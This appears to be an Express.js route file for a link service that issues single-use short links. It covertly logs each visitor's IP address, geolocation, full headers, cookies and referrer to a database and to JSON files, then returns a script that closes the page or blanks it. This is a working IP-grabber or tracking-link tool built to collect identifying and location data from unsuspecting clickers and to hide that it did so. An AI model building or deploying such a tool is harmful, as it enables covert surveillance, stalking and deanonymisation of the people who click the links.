const express = require('express');
const router = express.Router();
const DeviceData = require('../models/DeviceData');
const Link = require('../models/Link');
const useragent = require('useragent');
const fs = require('fs');
const path = require('path');
const shortid = require('shortid');
const axios = require('axios');

// Helper function to get a formatted timestamp
const getFormattedTimestamp = () => {
  const date = new Date();
  const yyyy = date.getFullYear();
  const mm = String(date.getMonth() + 1).padStart(2, '0');
  const dd = String(date.getDate()).padStart(2, '0');
  const hh = String(date.getHours()).padStart(2, '0');
  const min = String(date.getMinutes()).padStart(2, '0');
  const ss = String(date.getSeconds()).padStart(2, '0');
  return `${yyyy}-${mm}-${dd}_${hh}-${min}-${ss}`;
};

// Generate a unique link
router.get('/generate', async (req, res) => {
  const shortUrl = shortid.generate(); // Generate a unique short ID
  const originalUrl = `https://link-refer.onrender.com/link/${shortUrl}`;

  const newLink = new Link({ originalUrl, shortUrl, isActive: true, uniqueVisitorIds: [] });
  try {
    await newLink.save();
    res.send(`Share this link: <a href="${originalUrl}">${originalUrl}</a>`);
  } catch (error) {
    console.error('Error generating link:', error);
    res.status(500).send('Error generating link.');
  }
});

// Handle data collection when the unique link is accessed
router.get('/link/:shortUrl', async (req, res) => {
  const { shortUrl } = req.params;
  try {
    let link = await Link.findOne({ shortUrl });

    if (!link || !link.isActive) {
      return res.status(404).send('Link not found or is inactive.');
    }

    const ua = useragent.parse(req.headers['user-agent']);
    const uniqueVisitorId = shortid.generate(); // Generate a unique ID for each visitor

    let ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    if (ip === '::1' || ip === '127.0.0.1') {
      // Replace localhost IP with a public IP for testing
      ip = '8.8.8.8'; // Use a public IP like Google's DNS for testing
    }

    let locationData = {};
    try {
      // Get location data from ip-api
      const locationResponse = await axios.get(`http://ip-api.com/json/${ip}`);
      locationData = locationResponse.data;
    } catch (locationError) {
      console.error('Error fetching location data:', locationError);
    }

    const deviceData = new DeviceData({
      ip,
      ips: req.ips,
      browser: ua.family || 'Unknown',
      os: ua.os.family || 'Unknown',
      device: (ua.device && ua.device.family) || 'Unknown',
      timestamp: new Date(),
      headers: req.headers,
      path: req.path,
      query: req.query,
      method: req.method,
      protocol: req.protocol,
      hostname: req.hostname,
      httpVersion: req.httpVersion,
      originalUrl: req.originalUrl,
      subdomains: req.subdomains,
      referrer: req.get('Referrer') || req.get('Referer') || 'Unknown',
      cookies: req.cookies || 'None',
      body: req.body || 'None',
      userId: req.user ? req.user.id : null, // Example: If using authentication
      userAgent: req.headers['user-agent'],
      linkId: link._id, // Reference to the Link model
      uniqueVisitorId, // Save the unique ID for the visitor
      location: {
        country: locationData.country || 'Unknown',
        region: locationData.regionName || 'Unknown',
        city: locationData.city || 'Unknown',
        latitude: locationData.lat || 0,
        longitude: locationData.lon || 0
      }
    });

    // Save to MongoDB
    await deviceData.save();

    // Add the unique visitor ID to the link's uniqueVisitorIds array
    link.uniqueVisitorIds.push(uniqueVisitorId);
    await link.save();

    // Mark the link as inactive after the first visit
    link.isActive = false;
    await link.save();

    // Save to JSON file with a unique name based on timestamp
    const timestamp = getFormattedTimestamp();
    const fileName = `deviceData_${timestamp}.json`;
    const filePath = path.join(__dirname, '..', 'data', fileName);

    fs.writeFile(filePath, JSON.stringify(deviceData.toObject(), null, 2), (writeError) => {
      if (writeError) {
        console.error('Error writing to JSON file:', writeError);
        return res.status(500).send('Error saving device data.');
      }
      // Send response with script to close the page
      res.send(`
        <html>
          <body>
            <script>
              window.close();
              window.location.href = 'about:blank';
            </script>
          </body>
        </html>
      `);
    });
  } catch (error) {
    console.error('Error saving device data to MongoDB:', error);
    res.status(500).send('Error saving device data.');
  }
});

module.exports = router;
